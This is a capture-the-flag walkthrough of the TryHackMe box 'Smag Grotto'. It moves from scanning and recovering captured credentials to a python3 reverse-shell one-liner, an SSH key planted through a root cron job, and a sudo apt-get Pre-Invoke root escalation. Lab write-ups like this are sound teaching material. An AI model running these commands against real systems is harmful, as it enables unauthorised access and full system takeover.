# 'Smag Grotto' box writeup

## Smag Grotto is a CTF box written by JakeDoesSec and available on the [TryHackMe platform](https://tryhackme.com)

## Read about [`crontab` service](https://opensource.com/article/17/11/how-use-cron-linux), [apt-get package system tool](https://itsfoss.com/apt-get-linux-guide/) and [APT Privilege Escalation](https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/)

![bg](images/background.png?)

## Foothold

+ **We deploy the machine and start with a nmap scan for open ports**

``nmap -sV -sC -oN scan1 10.10.163.139``

+ **There are 2 services running on default ports: ssh and http**

![1](images/nmap_scan_sg.jpg?)

+ **Visiting the http site, we are welcomed by a big Smag title with a small announce from the developer of the site**

![2](images/site_sg.png?)

+ **Let's perform a gobuster to search some directories on the website.**
**I'm using the `common.txt` wordlist, a default wordlist on kali machines**

``gobuster dir -u http://10.10.163.139/ -w /usr/share/wordlists/dirb/common.txt``

![3](images/dirbuster.jpg?)

+ **We found a mail directory, so let's check it out into the web browser.**
**It seems to be like a mail message left on the website to notify a future migration.**
**The mail was written with the intention to arrive to the admin of the page**

![4](images/mail_page.png?)

+ **Inside the first Network Migration box of the message, we can spot the `dHJhY2Uy.pcap`, a linked file which seems to be a packet data of this network.**
**Let's download that file and go into a Wireshark analysis of this packet.**

![5](images/wiresh_packet.png?)

+ **We can spot a `POST` login request inside the data packet, so let's follow TCP stream into this packet**

![6](images/tcp_stream.png?)

+ **Bingo!**
**We found some credentials in plain text form.**
**Looking in the picture above us, we can see the Host that has been used in the `POST` login request: `development.smag.thm`.**
**If we are trying to access that page, we're having trouble finding that site...**
**But, judging on the mails that the developers shared between them, the website suffered a migration, so let's just try to change our hosts list to override the DNS**

``sudo vim /etc/hosts``

![7](images/hosts.jpg?)

+ **Now, let's try to access the `development.smag.thm/login.php` page so we can use our credentials**

![7](images/login_1.jpg?)

+ **We are welcomed by a big title 'Enter a command' with a box below.**
**I tried some several linux commands like ls, whoami, etc, but i can't see no output.**
**So i've tried to download a file on the box machine with the `wget`, hosting a simple python server on mine, just to check if the commands are available and if it's worth trying a reverse shell.**

![8](images/wget.jpg?)

## User escalation

+ **It's all working, we have the `GET` request so let's move on to a reverse shell, using python3.**
**I've tried with python but not working, because probably on the machine a python3 is installed.**
  **Firstly, listen to the 1234 port**

```console
nc -lvnp 1234
```

```console
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

 **And here it's our shell, connected with the www-data user.**
 **Let's upgrade it to an interactive one.**

```console
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![9](images/entered_2.jpg?)

+ **Let's look into the `crontab` file and understand it.**
**We have a `cron` which tells us that the root user is making an overwriting action every minute through the cat command from the** `jake_id_rsa.pub.backup` **file to the** `authorized_keys` **file of the jake user.**
**This means that if we can modify the `jake_id_rsa.pub.backup` content, we can connect with the jake user on the ssh service.**

![10](images/crontab.jpg?)

 **Luckily, the** `jake_id_rsa.pub.backup` **file has writing permission for every user.**

![11](images/fileperm.jpg?)

+ **Let's copy our public key into the remote box.**

```console
cat /home/kali/.ssh/id_rsa.pub
echo "your_id_rsa.pub" > /opt/.backups/jake_id_rsa.pub.backup
```

![12](images/copy_id.jpg?)

![13](images/copy_id_2.jpg?)

+ **Now, we have overwritten the public ssh and we can use public key authentication.**
**Voila, there's our user flag**

![13](images/user_flag.jpg?)

## Root Escalation

+ **Running the** ``sudo -l`` **command, we can see the allowed commands for the user jake.**
**He has a powerful accessible command to run: apt-get, which is the command-line tool to interact with this packaging system.**

![14](images/sudola.jpg?)

+ **Exploiting the apt-get vulnerability, we can use the tool to gain a root access, using the update option and simultaneously invoking the bash into the root account**

``sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/bash``

 ![15](images/root_flag_1.jpg?)

 **So here we got the root flag.**
 **It was a funny box with an interesting vulnerability based on apt tool, a very useful box for beginners.**
